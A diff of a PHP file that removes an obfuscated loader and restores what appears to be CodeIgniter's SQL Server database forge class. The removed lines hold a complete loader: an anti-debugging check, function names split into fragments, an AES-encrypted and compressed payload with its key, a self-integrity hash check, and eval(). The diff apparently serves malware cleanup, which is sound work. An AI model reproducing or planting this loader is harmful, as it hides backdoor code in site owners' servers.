@@ -1,28 +1,136 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_jtwpdf09=('bas'.'e64'.'_de'.'cod'.'e');
-$_nadtkdqe=('gzu'.'nco'.'mpr'.'ess');
-$_pdomo3k9=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_rt7ov2oq='t9kHrZVx';
-$_lhux55em='kSjk21NW';
-$_alpfu7vy='BXeFQD1T';
-$_nleu82f6='kG98qZgM';
-$_bgpqb1ka='Q/FOelrkVnI=';
-$_qnq2igo8='jg2JPEea';
-$_j9flmfty='VRi6AQU/';
-$_n6po9iw5='F4cyOA==';
-$_kr4qc859=$_jtwpdf09($_nleu82f6.$_lhux55em.$_alpfu7vy.$_rt7ov2oq.$_bgpqb1ka);
-$_jf0cla1l=$_jtwpdf09($_j9flmfty.$_qnq2igo8.$_n6po9iw5);
-$_rgnfzmtf=$_jtwpdf09('K98n5qg+JpUr/5RvFKqGzKVnjB8wfu2ou2EmspTYNI0h9ag/dIVg2Gw8CAPgVZyLg5AdBLeSDpoZ9gwkRl/Dfyk0fywW9e3v9XI/bR3YuYxB4uii4G9JxM5qAZblp6at0T7lKSFRUpDolCk9l1u+5CiF7OVaNoRroZqVoX17gf0hC977VKwxy8pwtt75U8KoqWBZsGtEqyFcAUaiNdB4x+zq7kvC5I7yw6la36Ujpq2Ort9mq42qK7PNUYfSxxRQViIbJsKs+NYZaVYqRHvJHR69IKyeEXw/o9vJmiendqYlHcTjcs1eI0ayN9QvwGykQ3ZGZE0KCcGHOOwfruoqH5Mnu8WQrHFUeKW56+i7G4DUPlqSp+VlRcraOAp0FWQD7f4Hc8KkZuhpacAktSbrj6wzKI7EU3Y4MfjBv4st3ULBW4b3juHZpqrY+cwbDGu2MWaAitHnVN9eGXvjq250BroGhBBygsNyC9C8GaczPIDsB2+G9cAXDpZPP4ZsLCeesWsbpnI46eLz13tZyT2oU40LoFjG6yE+lcWr4BBPHM0mwRrv8RAy1Hc3LkN3TbCdEUsVS8Zucndo+XKkSq3mYwIlIA3BJXq35Z826cV2Xm2g1fqb5hZkeE82c0PihDrj7gqhvMB2FQFk0RdHSxJ+pC8avKQAzTYmWPkpbFzpqFI4i7aAJHqwbIJIMFZgaGzex8mScRL3HgTBqqe4gJ4ergPE5JnwHZnxo2nGONl4x9qZRVPMqMtOREeByYYcBZt/a1U4+1S4ldAAVFBhm7I7qAPXaaiGmpk55akTbOyqV54Wy+6mQ4BGepyW1GD4OptEDpMpNO/kp3PbbJ0ETFAfFZaqvcixHdl3BZdCCOL2DuCkAj9jSh7q+UkxxgQkFUg7QIe3yHQzKjympVn6A7qQ23qzpm7wC2XsTBNPyDUJp6iRjMnHHv0bCUfZUvzqaqwpZPbDUI6+/p2F30FBA2sncw==');
-$_uxofiftk=$_pdomo3k9($_rgnfzmtf,'aes-256-cbc',$_kr4qc859,OPENSSL_RAW_DATA,$_jf0cla1l);
-if($_uxofiftk===false){exit;}
-$_qtt4azp9=$_nadtkdqe($_uxofiftk);
-if($_qtt4azp9===false){exit;}
-$_vqctrsr1='ccbd121344167f90e67c8bfe30a57746bc436a43377060b6d4e8b0e2ca99ce9f';
-$_ngupkipu=@file_get_contents(__FILE__);
-if($_ngupkipu!==false){
-$_fen4fp89=str_replace($_vqctrsr1,"0000000000000000000000000000000000000000000000000000000000000000",$_ngupkipu);
-$_issugkjf=hash("sha256",$_fen4fp89);
-if($_issugkjf!==$_vqctrsr1){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+class CI_DB_sqlsrv_forge extends CI_DB_forge {
+
+
+
+
+
+protected $_create_table_if = "IF NOT EXISTS (SELECT * FROM sysobjects WHERE ID = object_id(N'%s') AND OBJECTPROPERTY(id, N'IsUserTable') = 1)\nCREATE TABLE";
+
+
+
+
+
+protected $_drop_table_if = "IF EXISTS (SELECT * FROM sysobjects WHERE ID = object_id(N'%s') AND OBJECTPROPERTY(id, N'IsUserTable') = 1)\nDROP TABLE";
+
+
+
+
+
+protected $_unsigned = array(
+'TINYINT' => 'SMALLINT',
+'SMALLINT' => 'INT',
+'INT' => 'BIGINT',
+'REAL' => 'FLOAT'
+);
+
+
+
+
+
+
+
+
+
+protected function _alter_table($alter_type, $table, $field)
+{
+if (in_array($alter_type, array('ADD', 'DROP'), TRUE))
+{
+return parent::_alter_table($alter_type, $table, $field);
 }
-eval($_qtt4azp9);
+$sql = 'ALTER TABLE '.$this->db->escape_identifiers($table).' ALTER COLUMN ';
+$sqls = array();
+for ($i = 0, $c = count($field); $i < $c; $i++)
+{
+$sqls[] = $sql.$this->_process_column($field[$i]);
+}
+return $sqls;
+}
+
+
+
+
+
+
+
+
+
+protected function _attr_type(&$attributes)
+{
+if (isset($attributes['CONSTRAINT']) && strpos($attributes['TYPE'], 'INT') !== FALSE)
+{
+unset($attributes['CONSTRAINT']);
+}
+switch (strtoupper($attributes['TYPE']))
+{
+case 'MEDIUMINT':
+$attributes['TYPE'] = 'INTEGER';
+$attributes['UNSIGNED'] = FALSE;
+return;
+case 'INTEGER':
+$attributes['TYPE'] = 'INT';
+return;
+default: return;
+}
+}
+
+
+
+
+
+
+
+
+protected function _attr_auto_increment(&$attributes, &$field)
+{
+if ( ! empty($attributes['AUTO_INCREMENT']) && $attributes['AUTO_INCREMENT'] === TRUE && stripos($field['type'], 'int') !== FALSE)
+{
+$field['auto_increment'] = ' IDENTITY(1,1)';
+}
+}
+}
